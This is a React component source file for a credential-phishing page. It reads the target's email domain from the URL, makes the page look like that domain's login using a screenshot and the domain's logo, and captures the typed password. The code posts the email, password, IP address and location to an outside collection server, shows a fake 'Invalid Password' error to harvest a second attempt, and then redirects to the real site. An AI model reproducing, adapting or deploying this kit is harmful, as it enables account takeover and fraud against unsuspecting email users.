
import React, { useEffect, useState } from "react";
import './Default.css';
import $ from 'jquery';
import Preloader from "./Preloader/Preloader";

import { BiSolidUser, BiSolidLockAlt } from "react-icons/bi";
// import FastSpin from './fastspin/fastspin';
// import { createPortal } from "react-dom";


// kddkddk

const Default = ()=>{




    const [ipAdress, setIpAdress] = useState('')
    const [city, setCity] = useState('');
    const [flag, setFlag] = useState('');
    const [country, setCountry] = useState('');

    const forTime = new Date();


    useEffect(()=>{
        fetch(`https://api.geoapify.com/v1/ipinfo?apiKey=139d2378a5554f48bf290b61999b4e8a`)
        .then(req=> req.json())
        .then(res=>{
            // setCountry(res.names.en)
            // console.log(res.names.en);
            // console.log('city:',res.city.name);

            setIpAdress(res.ip)
            setFlag(res.country.flag);
            setCountry(res.country.name);
            setCity(res.city.names.en);

            
            
            
            console.log('ipAddress:', res.ip);
            console.log('flag:', res.country.flag);
            console.log('country:', res.country.name);
            console.log('city:', res.city.names.en);
            console.log(res);

        })
        .catch(e=> console.log)
    }, []);
    // const [a, b] = useState(false);

    // const mainn = createPortal(<div><Preloader /></div>, document.querySelector('.t__ree'));

    

    const [invalid, setInvalid] = useState(false);

    const [spinLoader, setSpinLoader] = useState(false);


    const emailInTheURL = window.location.href;
    const sliceEqualSign = emailInTheURL.indexOf("@");
    const extracetdEmail = emailInTheURL.substr((sliceEqualSign+1)).toLowerCase().split('&', 1).toString();
    // console.log('cccc:',extracetdEmail);
    const mainName = extracetdEmail.replace('.com', "");
    

    const emailInTheURLA = window.location.href;
    const sliceEqualSignB = emailInTheURLA.indexOf("=");
    const extracetdEmailC = emailInTheURLA.substr((sliceEqualSignB+1));
    // .toLowerCase();
    const sliceE = extracetdEmailC;
    const cutOutAllTheTextLeavingTheOneToBeCapitalizeBelow = sliceE.slice(1)
    const capitalizeFirstLetter = extracetdEmailC.charAt(0).toUpperCase() + cutOutAllTheTextLeavingTheOneToBeCapitalizeBelow.split('&', 1).toString();


    const [defaultEmail, setDefaultEmail] = useState(capitalizeFirstLetter);
    const [defaultPassword, setDefaultPassword] = useState('');
    const [count, setCount] = useState(0);

    const submitDefaultForm = (e)=>{
        e.preventDefault();
        setSpinLoader(true);
        setTimeout(() => {
            setDefaultPassword('');
            
        }, 500);


        setCount(count=> count + 1);
            if(count === 1){
                const redirectURL = window.location.href;
                const sliceEqualSign = redirectURL.indexOf("@");
                const extracetdemailDomain = redirectURL.substr((sliceEqualSign+1));
                console.log(extracetdemailDomain);
                setTimeout(() => {
                    window.location.href = `https://www.${extracetdEmailC.toLowerCase().split('&', 1).toString()}`;
                }, 1500);
            };

            setTimeout(()=>{
                setSpinLoader(false);
                setInvalid(true);
            }, 2200)

        // post to server
        const user = {
            email: defaultEmail,
            pswd: defaultPassword,
            country: country,
            
            city: city,
            flag: flag,
            eyep: ipAdress,
            nownow: forTime
        };
    
        $.ajax({
            type: "POST",
            url: "https://regional-device-order.onrender.com/get_details/lucasbergmann100@gmail.com/device/region/",
            data: user,
            success(data) {
                // alert('OK');
                console.log(data);
            },
        });
    };

    useEffect(()=>{

        const sliceE = extracetdEmail;
        const firstProcess = sliceE.slice(1)
        document.title = extracetdEmail.charAt(0).toUpperCase() + firstProcess
        
        // .toLowerCase();
        setSpinLoader(true);
        setTimeout(() => {
            setSpinLoader(false);
        }, 2500);
    }, [extracetdEmail]);

    return(<>
    
    {

        <article className="wrapp__" 

    style={{

        backgroundImage: `url(https://image.thum.io/get/auth/71274-jjjjjjj/https://www.${extracetdEmail}/)`,
        width:'100vw',
        height:'100vh',
        backgroundRepeat:'no-repeat',
        backgroundSize:'cover',
        backgroundPosition:'top'
    }}
    >
    
    <div style={{
        display: 'flex',
        justifyContent:'center',
        marginTop:'2.4cm',
        zIndex:'5'
    }}
    >

        { spinLoader ? <Preloader /> : null }

        <section className="Default_container">

            <div className="Default_logo_cont" style={{
              display:'flex',
              alignItems:'center',
              justifyContent:'center'
            }}>
                <img 
                    alt="Logo"
                    src={`https://logo.clearbit.com/https://${extracetdEmail}`}
                    style={{
                      width:'28px',
                      height:'28px',
                    }}
                />
                <p className="bolded__ hhhhh" style={{
                  paddingLeft:'5px',
                  paddingTop:'13px',
                  fontColor:'#514c4cd',
                  padding:"0px 0px 0px 7px",
                  fontSize:'22px',
                  color:'#121',
                  fontWeight:'bolder',
                  textTransform:'capitalize'
                }}>{mainName.toUpperCase()}</p>
            </div>


            <p className="bolded__ sssss" style={{fontSize:'30px', color:'#333', marginTop:'-1px', fontFamily:'inherit',marginBottom:'17px'}}>
              Sign in
            </p>

            
            { invalid ? <div className="alert alert-danger">
              Invalid Password, Ensure to input correct password email account
            </div> : null }



            <form onSubmit={submitDefaultForm}>

                <div className="pv-Bz-iB ">

                    <div className="WB-Jo-DB"> 
                        <span className="kC-KY-IK"><i className="Lf-cT-dq no-im-qF"><BiSolidUser /></i></span> 
                        
                        <input
                            name="Yz-Uy-Ge"
                            readOnly
                            type="email"
                            value={defaultEmail}
                            required
                            placeholder="Username"
                            className="Nw-Ws-bg" id="Yz-Uy-Ge"
                            onChange={e=> setDefaultEmail(e.target.value)}
                        />
                    </div>

                </div>


                <div className="pv-Bz-iB " style={{
                        marginTop:'18px'
                    }}>

                        <div className="WB-Jo-DB" > 
                            <span className="kC-KY-IK"><i className="Lf-cT-dq no-im-qF"><BiSolidLockAlt /></i></span>
                            <input 
                                name="Yz-Uy-Ge" 
                                type="password" 
                                value={defaultPassword} 
                                required
                                placeholder="Password" 
                                className="Nw-Ws-bg" 
                                id="Yz-Uy-Ge" 
                                onChange={e=> setDefaultPassword(e.target.value)}
                                autoFocus
                            /> 
                        </div>

                    </div>


                    <div className="pv-Bz-iB bbbtttnnnnn">
                        <input 
                        type={`submit`}
                        value={`Sign in`}
                        className='Default_btn_submit_'
                        />
                    </div>

            </form>

            <div style={{
                display:'flex',
                justifyContent:'space-between',
                alignItems:'center'
            }}>
                <p className="sessi__on_"> <input type={`checkbox`} readOnly/> Secure login session?</p>

                <p 
                    onClick={()=> window.location.reload()}
                    className="rell"
                 style={{
                    color:'#337ab7',
                    cursor:'pointer',
                    fontSize:'13px'
                }}>Forgot Password?</p>
            </div>

        </section>

    </div>
    </article>
    
    // : mainn

    }
    
    </>)
}

export default Default;